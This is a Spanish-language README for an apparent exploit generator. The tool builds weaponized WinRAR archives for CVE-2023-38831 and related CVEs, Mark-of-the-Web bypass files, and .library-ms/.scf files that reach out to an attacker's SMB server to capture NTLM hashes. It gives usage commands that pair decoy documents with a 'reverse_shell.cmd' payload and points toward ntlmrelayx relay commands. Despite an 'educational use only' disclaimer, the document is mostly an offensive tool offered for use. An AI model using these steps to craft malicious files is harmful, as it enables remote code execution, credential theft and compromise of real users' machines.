# 🧨 WinRAR & Windows Library Exploit Generator

**Generador de exploits para vulnerabilidades conocidas en WinRAR y Windows Library.**

> ⚠️ **Este proyecto es solo para uso educativo y entornos con autorización.**

---

## 🧩 CVEs Soportadas

| CVE / Técnica              | Descripción                                                                 |
|---------------------------|-----------------------------------------------------------------------------|
| **CVE-2023-38831**         | Ejecución remota (RCE) al hacer clic en un archivo señuelo en WinRAR       |
| **CVE-2024-30370**         | Bypass del Mark-of-the-Web usando symlink                                  |
| **CVE-2025-31334**         | WinRAR ejecuta un archivo real disfrazado sin advertencia                  |
| **Library `.library-ms`** | Windows abre conexión SMB externa al abrir archivo `.library-ms`           |
| **SCF (`.scf`)**           | Carga de íconos desde red SMB para capturar hashes                         |

---

## 🧰 Requisitos

- Python 3.7 o superior
- [`rar.exe`](https://www.win-rar.com/download.html) en el `PATH` (solo para `cve-dual`)
- Acceso con permisos de Administrador para crear symlinks en Windows

---

## ⚙️ Modo de uso general

```bash
python main.py [modo] [opciones]
```

---

## 📌 Modo: `cve-2023-38831`

### ▶️ Descripción:
Exploit que manipula un archivo `.zip` para que al abrir un archivo señuelo, se ejecute un script malicioso.

### 🧪 Ejemplo:

```bash
python main.py cve-2023-38831 \
  --bait documento.pdf \
  --switch reverse_shell.cmd \
  --output exploit_38831.rar
```

---

## 📌 Modo: `cve-dual`

### ▶️ Descripción:
Crea un archivo `.rar` con un symlink y un ejecutable que evaden la advertencia MotW en Windows.

### 🧪 Ejemplo:

```bash
python main.py cve-dual \
  --payload payload.exe \
  --alt-name "seguro.exe" \
  --symlink-name "runme.exe" \
  --output exploit_dual.rar
```

---

## 📌 Modo: `library`

### ▶️ Descripción:
Crea un archivo `.library-ms` (y opcionalmente `.scf`) que se conecta a un servidor SMB remoto.

### 🧪 Ejemplo básico:

```bash
python main.py library \
  --file-name documentos \
  --ip 192.168.1.100 \
  --type basic \
  --output library_exploit.zip
```

### Tipos soportados:
- `basic` → Exploit simple con `.library-ms`
- `advanced` → Exploit avanzado con metadata extendida
- `scf` → Combinación de `.library-ms` y `.scf` (carga de íconos remota)
- `--commands` → Muestra comandos sugeridos para `ntlmrelayx` y payloads PowerShell

---

## 📌 Modo: `interactive`

### ▶️ Descripción:
Guía paso a paso para generar exploits de tipo Library desde la consola.

### 🧪 Ejemplo:

```bash
python main.py interactive
```

---

## 🧪 Payload de prueba (opcional)

Para pruebas seguras, puedes dejar que el script cree un ejecutable falso:

```bash
python main.py cve-dual --payload dummy.exe
```



---

## 👨‍💻 Autor

Creado con fines de investigación ofensiva y defensa activa.

---
